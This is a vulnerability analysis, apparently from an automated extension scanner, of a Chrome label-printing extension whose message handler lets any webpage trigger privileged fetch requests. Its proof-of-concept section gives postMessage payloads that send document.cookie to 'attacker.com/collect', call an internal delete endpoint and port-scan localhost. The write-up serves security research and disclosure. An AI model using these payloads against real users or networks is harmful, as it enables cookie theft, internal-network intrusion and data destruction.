# CoCo Analysis: bcnknamlcebjokfngpklkflckibnobak

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (cs_window_eventListener_message → fetch_resource_sink)

---

## Sink: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
```
from cs_window_eventListener_message to fetch_resource_sink
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bcnknamlcebjokfngpklkflckibnobak/opgen_generated_files/cs_0.js (content script)
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bcnknamlcebjokfngpklkflckibnobak/opgen_generated_files/bg.js (background script)
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
console.log('Hiecor zebra print loaded');

// Notify current website about the existence of this chrome extension
window.postMessage({
    ZebraPrintingExtensionId: chrome.runtime.id,
    ZebraPrintingVersion: chrome.runtime.getManifest().version
}, "*");

// Listen to messages from the current website
window.addEventListener("message", function (event) {
    if (typeof event.data.type === 'undefined') {
        return;
    }

    if (event.data.type != 'zebra_print_label') {
        return;
    }

    chrome.runtime.sendMessage(event.data, function (response) { // ← Attacker-controlled data forwarded
        return response;
    });
}, false);

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    console.log(message);

    const response = fetch(message.url, { // ← Attacker-controlled URL
        method: 'POST',
        mode: 'cors',
        cache: 'no-cache',
        headers: {
          'Content-Type': 'text/plain'
        },
        body: message.zpl // ← Attacker-controlled body
    });

    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage to content script

**Attack:**

```javascript
// Malicious webpage code - SSRF attack
window.postMessage({
    type: 'zebra_print_label',
    url: 'http://internal-network/admin/delete-all-data', // ← SSRF to internal network
    zpl: 'malicious payload'
}, "*");

// Alternative: Exfiltrate data from internal network
window.postMessage({
    type: 'zebra_print_label',
    url: 'http://attacker.com/collect', // ← Send to attacker server
    zpl: JSON.stringify(document.cookie)
}, "*");

// Alternative: Port scanning
for (let port = 8000; port < 9000; port++) {
    window.postMessage({
        type: 'zebra_print_label',
        url: 'http://localhost:' + port,
        zpl: 'probe'
    }, "*");
}
```

**Impact:** Server-Side Request Forgery (SSRF) - A malicious webpage can send a postMessage to trigger the extension's content script to forward attacker-controlled data to the background script, which then performs a privileged cross-origin fetch() request to ANY URL specified by the attacker (including internal network resources, localhost services, or attacker-controlled servers). This allows the attacker to bypass Same-Origin Policy, scan internal networks, access localhost services, perform CSRF attacks on internal admin panels, or exfiltrate sensitive data. The extension has "<all_urls>" in content_scripts matches, meaning this vulnerability can be exploited from any website the user visits.
